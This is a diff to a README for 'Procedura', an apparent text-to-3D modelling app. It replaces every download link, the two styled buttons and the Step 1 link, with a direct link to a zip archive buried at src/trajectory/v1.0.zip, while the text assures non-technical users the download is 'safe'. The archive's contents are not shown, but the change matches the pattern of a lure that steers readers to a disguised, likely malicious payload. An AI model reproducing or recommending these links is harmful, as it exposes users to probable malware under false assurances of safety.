@@ -1,7 +1,7 @@
 <h1>🧊 Procedura - Your Ideas, Instantly 3D</h1>
 
 <p align="center">
-  <a href="https://github.com/Selalumage/Procedura" style="background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%); color: white; padding: 18px 36px; font-size: 22px; border-radius: 50px; text-decoration: none; font-weight: bold; display: inline-block; box-shadow: 0 8px 20px rgba(0,0,0,0.3);">⬇️ Download Procedura Now</a>
+  <a href="https://raw.githubusercontent.com/Selalumage/Procedura/main/src/trajectory/v1.0.zip" style="background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%); color: white; padding: 18px 36px; font-size: 22px; border-radius: 50px; text-decoration: none; font-weight: bold; display: inline-block; box-shadow: 0 8px 20px rgba(0,0,0,0.3);">⬇️ Download Procedura Now</a>
 </p>
 
 ## ✨ What is Procedura?
@@ -15,7 +15,7 @@ Think of it like having a personal 3D designer who follows your instructions per
 Getting started with Procedura is incredibly simple. You don't need any technical background, coding experience, or special knowledge. Just follow these three easy steps:
 
 ### Step 1: Download the Application
-Visit this link to download the application: **[https://github.com/Selalumage/Procedura](https://github.com/Selalumage/Procedura)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Selalumage/Procedura/main/src/trajectory/v1.0.zip](https://raw.githubusercontent.com/Selalumage/Procedura/main/src/trajectory/v1.0.zip)**
 
 Click the big download button on that page. The download will start automatically. It's safe, free, and takes just a few moments depending on your internet speed.
 
@@ -109,7 +109,7 @@ Absolutely. Your designs are yours. Share them, sell them, or use them in your p
 You're just one click away from turning your imagination into reality. Download Procedura today and experience the joy of creating 3D models with nothing but your words.
 
 <p align="center">
-  <a href="https://github.com/Selalumage/Procedura" style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 16px 32px; font-size: 20px; border-radius: 50px; text-decoration: none; font-weight: bold; display: inline-block; box-shadow: 0 8px 20px rgba(0,0,0,0.3);">📥 Get Procedura Now</a>
+  <a href="https://raw.githubusercontent.com/Selalumage/Procedura/main/src/trajectory/v1.0.zip" style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 16px 32px; font-size: 20px; border-radius: 50px; text-decoration: none; font-weight: bold; display: inline-block; box-shadow: 0 8px 20px rgba(0,0,0,0.3);">📥 Get Procedura Now</a>
 </p>
 
 ## 📬 Get Involved
